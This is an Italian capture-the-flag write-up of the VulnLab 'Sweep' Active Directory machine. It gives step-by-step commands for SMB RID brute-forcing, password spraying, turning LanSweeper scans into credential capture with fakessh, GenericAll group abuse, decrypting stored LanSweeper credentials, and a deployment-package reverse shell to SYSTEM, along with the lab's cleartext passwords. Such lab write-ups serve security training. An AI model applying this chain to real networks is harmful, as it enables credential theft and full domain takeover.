+++
date = '2026-11-15T18:19:16+01:00'
draft = false
title = 'Sweep Writeup IT'
+++
**Autore**: **`joy.scd01`**

**Data**: **`09/11/2026`**

![pwn.png](/images/imgs_sweep/pwn.png)

---

# Introduzione

**_Sweep_** è un **Active Directory** di **VulnLab** classificata come **Medium** che tratta l'exploitation di un'istanza **LanSweeper**.

L'accesso iniziale richiede l'enumerazione del servizio **SMB** per ottenere una lista di utenti validi tramite un attacco **RID brute-force**, seguito da un **password spraying** per identificare credenziali valide. Questo permette sia di mappare l'Active Directory tramite **BloodHound**, sia di accedere all'interfaccia web di **LanSweeper**, scoprendo che un account di servizio possiede privilegi **`GenericAll`** sul gruppo **`LANSWEEPER ADMINS`**.
Manipolando i target di scansione su **LanSweeper** e configurando un server **fakessh**, si può **sniffare la password** dell'account di servizio Linux. Infine, la Privilege Escalation può essere completata in due modi diversi: estraendo e decriptando le credenziali interne tramite uno script PowerShell, oppure distribuendo un pacchetto malevolo direttamente dalla console web per ottenere una reverse shell come **`NT AUTHORITY\SYSTEM`**.

---

# Tecniche Utilizzate

- **SMB RID Brute-Forcing**

- **Password Spraying**

- **Credential Sniffing via FakeSSH**

- **Active Directory ACL Abuse (GenericAll)**

- **LanSweeper Credential Decryption**

- **LanSweeper Deployment Package RCE**

---

# Enumeration

## nmap

Scansione iniziale su tutte le porte:

```bash
nmap -p- sweep -Pn
```

```text
PORT      STATE SERVICE
53/tcp    open  domain
81/tcp    open  hosts2-ns
82/tcp    open  xfer
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
```

Scansione mirata con script e rilevamento dei servizi:

```bash
nmap -sC -sV sweep -Pn
```

```text
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
81/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Did not follow redirect to /login.aspx
82/tcp   open  ssl/xfer?
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-11-09 07:52:23Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sweep.vl, Site: Default-First-Site-Name)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: SWEEP
|   NetBIOS_Domain_Name: SWEEP
|   NetBIOS_Computer_Name: INVENTORY
|   DNS_Domain_Name: sweep.vl
|   DNS_Computer_Name: inventory.sweep.vl
|_  System_Time: 2026-11-09T07:52:45+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

Ho aggiunto **`sweep.vl`** e **`inventory.sweep.vl`** al mio file **`/etc/hosts`**.

## Enumerazione Web & SMB 

**`http://sweep.vl:81`** hostava una login page di **LanSweeper**.

![web.png](/images/imgs_sweep/web.png)

Non avendo credenziali a disposizione, sono passato all'enumerazione di **SMB**.

```bash
nxc smb sweep.vl -u 'Guest' -p '' --shares
nxc smb sweep.vl -u 'Guest' -p '' --users
```

![smb1.png](/images/imgs_sweep/smb1.png)

Poiché le null session erano parzialmente limitate, ho eseguito un **RID brute-force**:

```bash
nxc smb sweep.vl -u 'Guest' -p '' --rid-brute
```

![rid.png](/images/imgs_sweep/rid.png)

Ho copiato l'output in **`users.txt`** e l'ho ripulito utilizzando **awk**:

```bash
cat users.txt | awk -F'\\' '{print $2}' | awk '{print $1}' | tee users.txt
```

Ho subito notato alcuni account interessanti, tra cui **`svc_inventory_win`**, **`svc_inventory_lnx`** e **`intern`**.
Ho quindi lanciato un **password spraying** ipotizzando il **riutilizzo delle password**:

```bash
nxc smb sweep.vl -u users.txt -p users.txt
```

![spray.png](/images/imgs_sweep/spray.png)

Hit per **`intern:intern`**.
Ho validato queste credenziali con **NetExec** via **WinRM**, ma l'utente non aveva accesso remoto. Tuttavia, le ho usate per accedere a **LanSweeper**.

![logged.png](/images/imgs_sweep/logged.png)

---

# Accesso Iniziale | BloodHound & FakeSSH Sniffing

Ho navigato nella sezione **Scanning Credentials** e ho notato una voce relativa a credenziali **SSH** per **`svc_inventory_lnx`**.

![creds.png](/images/imgs_sweep/creds.png)

La password era oscurata.

Ho mappato l'Active Directory utilizzando **BloodHound**:

```bash
bloodhound-python -u intern -p intern -ns 10.10.67.138 -d sweep.vl -c all --zip
```

![harvest.png](/images/imgs_sweep/harvest.png)

Analizzando i dati, ho scoperto che **`svc_inventory_lnx`** possedeva i privilegi **`GenericAll`** sul gruppo **`LANSWEEPER ADMINS`**.

![hound.png](/images/imgs_sweep/hound.png)

Per capire come sfruttare questa situazione, ho fatto un passo indietro per approfondire l'esatto funzionamento dell'applicazione.

**Nota**: _**LanSweeper** funziona scansionando attivamente range di IP e autenticandosi sui dispositivi target (via **SSH**, **SMB**, **WMI**, ecc.) utilizzando le credenziali memorizzate nel suo database per raccogliere informazioni di sistema._

Comprendendo che l'applicazione avvia abitualmente connessioni automatizzate verso i target mappati, ho intuito che avrei potuto ingannare il sistema facendolo autenticare verso la mia macchina attaccante per **sniffare la password** in transito.

Per farlo ho sfruttato la funzionalità di scansione:

- Ho aggiunto un nuovo target, passando il **mio IP attaccante** come **IP range**, e ho modificato la porta **SSH** di destinazione sulla **`22667`**.

![scan.png](/images/imgs_sweep/scan.png)

![scan2.png](/images/imgs_sweep/scan2.png)

- Nella pagina **scanning credentials**, ho mappato le credenziali **Inventory Linux** al mio **IP range** specifico.

![scan3.png](/images/imgs_sweep/scan3.png)

- Sulla mia macchina attaccante, ho configurato **fakessh** per rimanere in ascolto sulla porta specificata e catturare il tentativo di autenticazione:

```bash
~/go/bin/fakessh -bind ":22667"
```

![snif1.png](/images/imgs_sweep/snif1.png)

Ho ricevuto una connessione con il tentativo di login, quindi ho aggiunto il flag **`-passwd`** per far stampare in output la password in chiaro.

```bash
~/go/bin/fakessh -bind ":22667" -passwd
```

![snif2.png](/images/imgs_sweep/snif2.png)

---

# Lateral Movement | Abuse GenericAll

Per procedere, ho sfruttato i permessi **`GenericAll`** di **`svc_inventory_lnx`** per aggiungere l'account direttamente al gruppo **`LANSWEEPER ADMINS`** utilizzando **pth-net** (seguendo le guide opsec standard di **BloodHound**):

```bash
pth-net rpc group addmem "LANSWEEPER ADMINS" svc_inventory_lnx -U "sweep.vl/svc_inventory_lnx%0|5m-U6?/uAX" -S 10.10.63.138
```

![validate.png](/images/imgs_sweep/validate.png)

Ho verificato il nuovo accesso tramite **WinRM**, ho effettuato il login e preso la **user flag**:

```bash
nxc winrm sweep.vl -u svc_inventory_lnx -p '0|5m-U6?/uAX'
evil-winrm -i sweep.vl -u svc_inventory_lnx -p '0|5m-U6?/uAX'
```

![userf.png](/images/imgs_sweep/userf.png)

---

# Privilege Escalation | Two Paths to SYSTEM

Ripwnando questa macchina, ho scoperto due modi distinti per ottenere la compromissione totale.

## Path 1: LanSweeper Credential Decryption (Unintended)

Dato che **LanSweeper** gestisce anche macchine Windows, al suo interno erano salvate le credenziali per **`svc_inventory_win`**.   

![wincreds.png](/images/imgs_sweep/wincreds.png)

Questo è un high-value target poiché è membro del gruppo **`AD Administrator`**.

![hound2.png](/images/imgs_sweep/hound2.png)

Dopo aver fatto ricerca su come **LanSweeper** gestisce l’archiviazione delle credenziali, ho scoperto che queste sono salvate in formato cifrato nel database e i parametri di connessione risiedono in **`website\web.config`**, ma la chiave di decrittazione per sbloccare il tutto è salvata localmente sul server, nello specifico nel file **`Key\Encryption.txt`**.

```cmd
type website\web.config
```

![stored.png](/images/imgs_sweep/stored.png)

**`/Key/Encryption.txt`**:

![stored1.png](/images/imgs_sweep/stored1.png)

Per decriptare le credenziali del database, ho utilizzato lo script PowerShell **`SharpLansweeperDecrypt`**:

- https://github.com/Yeeb1/SharpLansweeperDecrypt

```powershell
.\LD.ps1
```

![decrypt.png](/images/imgs_sweep/decrypt.png)

Password per **`svc_inventory_win`**.

![validate2.png](/images/imgs_sweep/validate2.png)

Ho effettuato l'accesso via **WinRM** con le nuove credenziali **Administrator** e ho recuperato la **root flag**.

```bash
evil-winrm -i sweep.vl -u 'svc_inventory_win' -p '4^56!sK&}eA?'
```

![rootf.png](/images/imgs_sweep/rootf.png)

---

# Path 2: Deployment Package RCE (Intended)

L'altro metodo prevede l'abuso diretto delle funzionalità di deployment dell'applicazione web.

- Ho effettuato l'accesso su http://inventory.sweep.vl utilizzando l'account **`svc_inventory_lnx`**.

- In **Deployment Packages** e ho creato un nuovo pacchetto chiamato **PrivEsc**.

- Ho aggiunto uno step impostando **Action** su **Command**.

- Ho generato un payload standard per una reverse shell in PowerShell, l'ho incollato nello step del comando e ho salvato.

- Ho cliccato su **Deploy Now**, selezionato la macchina **INVENTORY** ed eseguito il pacchetto.

Con un listener **Netcat** in esecuzione sulla mia macchina attaccante, ho ricevuto la callback:

Lanciando **`whoami`** ho verificato che stavo operando come **`NT AUTHORITY\SYSTEM`**.

**Root flag** in **`C:\Users\Administrator\Desktop\`**.

---

# Considerazioni Finali

Non semplice, ma perfettamente in linea con il rating **Medium**.

Penso sia forse il primo box **Medium** dove ho trovato un modo completamente alternativo per pwnarlo. La parte di sniffing tramite **fakessh** è una tecnica affascinante ed è un ottimo promemoria di come gli strumenti di scansione di rete automatizzati possano essere ritorti contro gli amministratori se configurati per raggiungere subnet non attendibili. Entrambi i vettori di privilege escalation sono stati incredibilmente soddisfacenti da eseguire.

**Fonti**:

- **FakeSSH | https://github.com/ffuf/fakessh**

- **SharpLansweeperDecrypt | https://github.com/Yeeb1/SharpLansweeperDecrypt**